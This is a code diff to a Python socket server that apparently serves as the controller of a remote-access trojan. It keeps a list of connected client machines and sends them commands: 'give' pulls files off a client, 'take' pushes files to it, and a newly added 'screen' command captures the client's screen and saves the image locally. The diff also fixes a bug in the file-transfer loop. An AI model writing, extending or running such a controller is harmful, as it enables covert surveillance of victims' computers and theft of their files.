@@ -1,6 +1,7 @@
 import socket
 import threading
 import os
+from datetime import datetime
 
 clients = []
 HOST = "0.0.0.0"
@@ -51,13 +52,13 @@ def give_file(client):
         target_loc = input("TARGET FILE:")
         save_to = input("SAVE TO:")
         file_name = target_loc.split("/")[-1]
+        file = open(os.path.join(save_to,file_name),"wb")
         client.sendall(f"GIVE\n{target_loc}".encode())
         size = client.recv(1024).decode("utf-8").strip()
         if size == "FAILED":
             print("FAILED")
             return
         size = int(size)
-        file = open(os.path.join(save_to,file_name),"wb")
         acc = 0
         client.send("OK".encode())
         data = client.recv(1024)
@@ -65,7 +66,7 @@ def give_file(client):
         while data:
             print(f"{acc}/{size}",end="\r")
             file.write(data)
-            if acc <= size:
+            if acc >= size:
                 print()
                 break
             data = client.recv(1024)
@@ -102,6 +103,34 @@ def take_file(client):
     except Exception as e:
         print(e)
 
+def save_screen(client):
+    try:
+        save_to = input("SAVE TO:")
+        file_name = str(datetime.now()) + ".jpg"
+        file = open(os.path.join(save_to,file_name),"wb")
+        client.sendall("SCREEN".encode())
+        res = client.recv(1024).decode().strip()
+        if res == "FAILED":
+            print(res)
+            return
+        size = int(res)
+        client.sendall("OK".encode())
+        acc = 0
+        data = client.recv(1024)
+        acc += len(data)
+        while data:
+            print(f"{acc}/{size}",end="\r")
+            file.write(data)
+            if acc >= size:
+                print()
+                break
+            data = client.recv(1024)
+            acc += len(data)
+        file.close()
+        print(f"SAVED:{os.path.join(save_to,file_name)}")
+    except Exception as e:
+        print(e)
+
 def beast(i):
     try:
         client = clients[i]
@@ -119,6 +148,8 @@ def beast(i):
             give_file(client["client"])
         elif cmd == "take":
             take_file(client["client"])
+        elif cmd == "screen":
+            save_screen(client["client"])
 
 def main():
     while True:
